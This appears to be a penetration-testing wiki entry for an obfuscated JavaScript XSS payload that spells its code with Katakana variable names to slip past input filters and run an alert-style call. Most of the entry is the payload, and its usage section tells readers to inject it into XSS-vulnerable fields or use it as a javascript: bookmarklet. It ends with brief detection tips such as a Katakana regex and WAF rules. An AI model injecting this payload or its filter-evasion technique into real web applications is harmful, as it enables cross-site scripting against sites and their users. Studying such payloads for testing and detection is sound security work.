---
id: 846eeee9-35f3-41ee-acfd-ae97ac1efdeb
type: code
language: JavaScript
verified: true
created_at: '2023-04-06T03:56:42.896665+00:00'
updated_at: '2023-04-10T20:21:53.756881+00:00'
platforms:
  - Web
tags:
  - xss
  - obfuscation
  - katakana
validated: true
---

# Obfuscated-JavaScript-XSS-Payload-Using-Katakana

## Code

```javascript
javascript:([,ウ,,,,ア]=[]+{},[ネ,ホ,ヌ,セ,,ミ,ハ,ヘ,,,ナ]=[!!ウ]+!ウ+ウ.ウ)[ツ=ア+ウ+ナ+ヘ+ネ+ホ+ヌ+ア+ネ+ウ+ホ][ツ](ミ+ハ+セ+ホ+ネ+'(-~ウ)')()
```

## Description

This code is an obfuscated JavaScript payload using Katakana Unicode characters to bypass input filters in XSS attacks. It decodes to execute a simple alert (or equivalent) function, demonstrating filter evasion by representing standard operators and strings in an unrecognized Unicode form.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| None | This payload has no runtime variables; it is self-contained and executes immediately upon injection. | N/A |

## Usage

Inject this as a bookmarklet (javascript: URI) or into an XSS-vulnerable input field. It is ideal for testing filter bypass in web applications during penetration testing or red team engagements. Combine with the [[procedures/Filter-Bypass-Using-Katakana-Library-for-XSS]] procedure to generate variations.

## Detection

- Scan for Unicode Katakana characters in inputs using regex patterns like /[゠-ヿ]/.
- Monitor JavaScript execution logs for obfuscated code deobfuscation attempts.
- Use WAF rules to flag javascript: URIs or unusual Unicode in script tags.

## Related

- [[procedures/Filter-Bypass-Using-Katakana-Library-for-XSS]]
- [[tools/Katakana-JS-Library]]
